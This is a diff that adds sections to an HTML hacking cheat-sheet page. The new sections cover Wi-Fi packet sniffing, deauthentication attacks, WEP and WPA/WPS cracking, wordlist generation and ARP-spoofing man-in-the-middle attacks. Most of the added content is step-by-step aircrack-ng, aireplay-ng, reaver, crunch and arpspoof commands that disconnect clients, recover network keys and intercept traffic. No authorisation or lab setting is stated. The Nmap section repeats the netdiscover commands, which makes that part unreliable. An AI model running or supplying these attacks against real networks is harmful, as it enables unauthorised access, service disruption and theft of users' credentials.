@@ -19,6 +19,8 @@
         <a class="admin-items one-top" href="#nhack">Network Hacking - Wi-Fi </a>
         <a class="admin-items one-top" href="#mac_change">MAC Change </a>
         <a class="admin-items one-top" href="#wifi_mode_change">Wi-FI mode </a>
+        <a class="admin-items one-top" href="#packet_sniff">Packet Sniffing </a>
+        <a class="admin-items one-top" href="#deauth_attack">Deauthentication attack</a>
     </div>
     <span id="nav-bar-btn" style="font-size: 30px; cursor: pointer" onclick="openNav()">&#9776;
     </span>
@@ -158,6 +160,325 @@
 
 
     </section>
+
+
+    <section name="packet_sniff" id="packet_sniff">
+        <br>
+        <h2>Packet Sniffing </h2>
+
+        <h3>Wi-Fi BANDS</h3>
+        <ul class="usage">
+            <li>Data can be sniffed from a certain band if the wireless adapter used supports that band.</li>
+            <li>Clients need to support band used by router to communiate with it.</li>
+            <li>a - 5GHZ</li>
+            <li>b,g - 2.4GHz</li>
+            <li>n - 5 and 2.4 GHz</li>
+            <li>ac - &lt; 6 Ghz</li>
+        </ul>
+
+        <h3>In Windows - Microsoft Network Monitor</h3>
+        <ul class="usage">
+            <li><a href="https://www.microsoft.com/en-in/download/details.aspx?id=4865">Download Microsoft Network
+                    Monitor</a></li>
+            <li>Install & Run as Administrator</li>
+            <li>New capture</li>
+            <li>Capture settings - wi-fi</li>
+            <li>Start</li>
+        </ul>
+
+        <h3>use AIRODUMP-NG</h3>
+        <ul class="usage">
+            <li>Part of aircrack-ng suit</li>
+            <li>Capture all packets within range</li>
+            <li>Detailed info about network around us</li>
+            <li>Connected clients</li>
+        </ul>
+        <pre><code>
+    <b class='terminal'>#</b> iwcofig
+
+    <i class="comment">// mon0 - The name of the interface that is in monitor mode.</i>
+    <b class='terminal'>#</b> airodump-ng mon0
+
+    <i class="comment">// Get 5GHz also</i>
+    <b class='terminal'>#</b> airodump-ng --band a mon0
+
+    <i class="comment">// Get 2.4 and 5 GHz also</i>
+    <b class='terminal'>#</b> airodump-ng --band abg mon0
+
+    <i class="comment">// pass - (BSSID & CH) ,  write to file</i>
+    <b class='terminal'>#</b> airodump-ng --bssid 00::11::22::33::44::55 --channel 2 --write test mon0
+    
+    <i class="comment">// Run wireshark and open the test-01.cap file and check the data.</i>
+    <b class='terminal'>#</b> wireshark
+
+</code></pre>
+
+    </section>
+
+
+    <section name="deauth_attack" id="deauth_attack">
+        <br>
+        <h2>Deauthentication Attack </h2>
+
+        <h3>What?</h3>
+        <ul class="usage">
+            <li>Disonnect any client from any network</li>
+            <li>Works on encrypted network(WEP,WPA&WPA2)</li>
+            <li>No need to know the network key</li>
+            <li>No need to connect to the network</li>
+            <li>Idea - The attacker pretends to be the client by changing the mac address to the client and telling to
+                the router to disconnect.
+                Then again, the attacker pretends to be the router by changing the mac address to the router and telling
+                the client that your disconnect request succeeded.
+            </li>
+        </ul>
+        <h3>USE AIRPLAY-NG</h3>
+        <pre><code>
+    <i class="comment">// a - target / router , c - client , 100000000 - no of packets</i>
+    <b class='terminal'>#</b> aireplay-ng --deauth 100000000 -a F8:23:B2:B9:50:AB -c F9:24:B3:B0:51:AC mon0
+
+    <i class="comment">// In another terminal</i>
+    <b class='terminal'>#</b> airodump-ng --bssid F9:24:B3:B0:51:AC --channel 2 mon0
+        
+</code></pre>
+
+    </section>
+
+
+    <section name="wep" id="wep">
+        <br>
+        <h2>WEP Cracking (Gaining Access )</h2>
+
+        <h3>About?</h3>
+        <ul class="usage">
+            <li>Wired Equivalent Privacy</li>
+            <li>Old encryption</li>
+            <li>RC4 - algorithm</li>
+            <li>Still uses in some networks. can be cracked easily </li>
+            <li>client/router - send/recieve - encrypt/decrypt packets by using a key</li>
+        </ul>
+
+        <h3>Vulnerability?</h3>
+        <ul class="usage">
+            <li>Each packet is encrypted using a unique key stream</li>
+            <li>Random initialization vector(IV) is used to generate the keys streams</li>
+            <li>IV is only 24 bits</li>
+            <li>IV + key(password) = key stream </li>
+            <li>client/router - send/recieve - encrypt/decrypt packets by using a key</li>
+            <li>IV is sent in plaintext</li>
+            <li>IV will repeat on busy networks. This makes WEP vulnerable to statistical attacks</li>
+            <li>Repeated IV can be used to determine the key stream and break the encryption</li>
+        </ul>
+        <h3>AIRODUMP-NG & aircrack-ng</h3>
+        <ul class="usage">
+            <li>Capture a large number of packets / IVs</li>
+            <li>Analyse the captured IVs and crack the key</li>
+        </ul>
+        <pre><code>
+    <i class="comment">// collect packets</i>
+    <b class='terminal'>#</b> airodump-ng --bssid F9:24:B3:B0:51:AC --channel 2 --write basic_wep mon0
+
+    <i class="comment">// To crack key</i>
+    <b class='terminal'>#</b> aircrack-ng basic_wep-01.cap
+
+</code></pre>
+        <ul class="usage">
+            <li>Copy the key and remove all columns - this is the password of Wi-Fi</li>
+            <li>Problem - If network not busy, It would take some time to capture enough IVs</li>
+            <li>Solution - Force the AP to generate new IVs</li>
+        </ul>
+        <h3>Fake Authentication attack</h3>
+        <ul class="usage">
+            <li>Force the AP to generate new IVs</li>
+        </ul>
+        <pre><code>
+    <i class="comment">// collect packets</i>
+    <b class='terminal'>#</b> airodump-ng --bssid F9:24:B3:B0:51:AC --channel 2 --write arpreplay mon0
+
+    <i class="comment">// a - target , h - your device (ifconfig - first 12 digits of unspec - change '-' to ':')</i>
+    <b class='terminal'>#</b> aireplay-ng --fakeauth 0 -a F9:24:B3:B0:51:AC -h F2:34:B4:B0:61:BC mon0
+
+    <i class="comment">// To crack key</i>
+    <b class='terminal'>#</b> aircrack-ng arpreplay-01.cap
+
+</code></pre>
+        <h3>ARP Request Replay attack</h3>
+        <ul class="usage">
+            <li>Force the AP to generate new IVs</li>
+            <li>Wait for an ARP packet , capture it and replay(retransmit) it</li>
+            <li>This causes the AP to produce another packet with a new IV</li>
+            <li>Keep doing this till we have enough IVs to crack the key</li>
+        </ul>
+        <pre><code>
+    <i class="comment">// collect packets</i>
+    <b class='terminal'>#</b> airodump-ng --bssid F9:24:B3:B0:51:AC --channel 2 --write arpreplay mon0
+
+    <i class="comment">// b - target , h - your device (ifconfig - first 12 digits of unspec - change '-' to ':')</i>
+    <b class='terminal'>#</b> aireplay-ng --arpreplay -b F9:24:B3:B0:51:AC -h F2:34:B4:B0:61:BC mon0
+
+    <i class="comment">// To crack key</i>
+    <b class='terminal'>#</b> aircrack-ng arpreplay-01.cap
+
+</code></pre>
+
+    </section>
+
+
+    <section name="wpa" id="wpa">
+        <br>
+        <h2>WPA / WPA 2 Cracking</h2>
+
+        <h3>About?</h3>
+        <ul class="usage">
+            <li>Both can be cracked using the same methods</li>
+            <li>Made to address the issue in WEP</li>
+            <li>Much more secure</li>
+            <li>Each packet is encrypted using a unique temporary key </li>
+        </ul>
+        <h3>Vulnerability?</h3>
+        <ul class="usage">
+            <li>WPS is a feature that can be used with WPA&WPA2</li>
+            <li>Allows clients to connect without the password</li>
+            <li>Authentication is done using an 8 digit pin</li>
+            <li>8 digits is very small, we can try all possible pins in relatively short time. Then the wps pin can be
+                used to compute the actual password.</li>
+            <li>This only works if the router is configured not to use PBC (Push Button Authentication)</li>
+        </ul>
+        </code></pre>
+        <h3>Reaver - use if WPS enabled</h3>
+        <ul class="usage">
+            <li>Find the devices with WPS enabled and attack</li>
+        </ul>
+        <pre><code>
+    <i class="comment">// collect packets</i>
+    <b class='terminal'>#</b> wash --interface mon0
+
+    <i class="comment">// b - target , h - your device (ifconfig - first 12 digits of unspec - change '-' to ':')</i>
+    <b class='terminal'>#</b> aireplay-ng --fakeauth 30 -a F9:24:B3:B0:51:AC -h F2:34:B4:B0:61:BC mon0
+
+    <i class="comment">// To crack key , vvv - more info</i>
+    <b class='terminal'>#</b> reaver --bssid F9:24:B3:B0:51:AC --channel 1 --interface mon0 -vvv 
+
+</code></pre>
+
+        <h3>Wordlist attack - use if WPS disabled</h3>
+        <ul class="usage">
+            <li>Only packets that can aid with the cracking process are the handshake packets</li>
+            <li>Need to wait for a client connection to the target AP</li>
+            <li>Can use deauthentication attack for a client connection</li>
+            <li>Capture the 4-way handshake</li>
+        </ul>
+        <pre><code>
+    <i class="comment">// collect packets</i>
+    <b class='terminal'>#</b> airodump-ng --bssid F9:24:B3:B0:51:AC --channel 2 --write wpa_handshake mon0
+
+    <i class="comment">// b - target , h - your device (ifconfig - first 12 digits of unspec - change '-' to ':')</i>
+    <b class='terminal'>#</b> aireplay-ng --deauth 4 -a F9:24:B3:B0:51:AC -c F2:34:B4:B0:61:BC mon0
+
+</code></pre>
+
+        <ul class="usage">
+            <li>The handshake does not contain data that helps recover the key.</li>
+            <li>It contains data that can be used to check if a key is valid or not.</li>
+            <li>Create a wordlist of password and check the password valid or not</li>
+        </ul>
+        <pre><code>
+    <i class="comment">// To create a wordlist</i>
+    <i class="comment">// crunch [min][max][charactres] -t [pattern] -o [filename]</i>
+    <b class='terminal'>#</b> crunch 6 8 123abc$ -o wordlist -t a@@@@b
+
+</code></pre>
+        <ul class="usage">
+            <li>The password and handshake-packets data combine and generate MIC code then check match with MIC within
+                the packet.</li>
+        </ul>
+        <pre><code>
+    <i class="comment">// To get the password</i>
+    <b class='terminal'>#</b> aircrack-ng wpa_handshake-01.cap -w test.txt
+
+</code></pre>
+    </section>
+
+    <section name="postattack" id="postattack">
+        <br>
+        <h2>Post connection attacks</h2>
+        <h3>About?</h3>
+        <ul class="usage">
+            <li>Work against WiFi & Ethernet</li>
+            <li>Gather more info</li>
+            <li>Intercept data(username & password)</li>
+            <li>Modify data on the fly</li>
+            <li>Display all devices on the network</li>
+            <li>Display theri : IP,MAC,OS,Open ports, Running services.</li>
+        </ul>
+        <h3>Net discover</h3>
+        <ul class="usage">
+            <li>Display all devices on the network</li>
+        </ul>
+        <pre><code>
+    <i class="comment">// find your IP (eg : 10.0.2.16)</i>
+    <b class='terminal'>#</b> ifconfig
+
+    <i class="comment">// To Display all devices on the network</i>
+    <b class='terminal'>#</b> netdiscover -r 10.0.2.1/24
+
+</code></pre>
+        <h3>Nmap / Zenmap</h3>
+        <ul class="usage">
+            <li>Huge security scanner</li>
+            <li>From an Ip/Ip range it can dicover : Open ports, Running services, OS, Connected cients</li>
+            <li>Find the ports and running services. Check the vulnerabilities of that services (check with version) and
+                hack it!</li>
+        </ul>
+        <pre><code>
+    <i class="comment">// find your IP (eg : 10.0.2.16)</i>
+    <b class='terminal'>#</b> ifconfig
+
+    <i class="comment">// To Display all devices on the network</i>
+    <b class='terminal'>#</b> netdiscover -r 10.0.2.1/24
+
+</code></pre>
+
+    </section>
+
+    <section name="postattack-MI" id="postattack">
+        <br>
+        <h2>MITM - Man In The Mddle Attack (POST CA)</h2>
+        <h3>ARP Poisoning</h3>
+        <ul class="usage">
+            <li>victim &lt;--&gt; requests/responses &lt;--&gt; Hacker &lt;--&gt; requests/responses &lt;--&gt; Access
+                point &lt;--&gt; internet</li>
+            <li>ARP - link MAC & IP</li>
+            <li>hacker send "I am at 10.0.0.3 (IP of victim)" to AP</li>
+            <li>hacker send "I am at 10.0.0.6" (IP of AP) to victim</li>
+            <li>Why its possible ? clients accept responses even if they did not send a request & clients trust response
+                without any form of verification.</li>
+        </ul>
+
+        <h3>ARP Spoofing - use ARPSPOOF</h3>
+        <ul class="usage">
+            <li>simple and reliable</li>
+            <li>ported to most os</li>
+        </ul>
+        <pre><code>
+            <i class="comment">// arpspoof -i [interface] -t [clientIP] [gatewayIP]</i>
+            <i class="comment">// arpspoof -i [interface] -t [gatewayIP] [clientIP]</i>
+            
+            <b class='terminal'>#</b> arpspoof -i eth0 -t 10.0.2.3 10.0.2.1
+            <b class='terminal'>#</b> arpspoof -i eth0 -t 10.0.2.1 10.0.2.3
+
+            <i class="comment">// forward data to original destination</i>
+            <b class='terminal'>#</b> echo 1 > /proc/sys/net/ipv4/ip_forward
+
+</code></pre>
+    </section>
+
+
+
+
+
+
+
 
     <div style="overflow-x:auto;">
     </div>
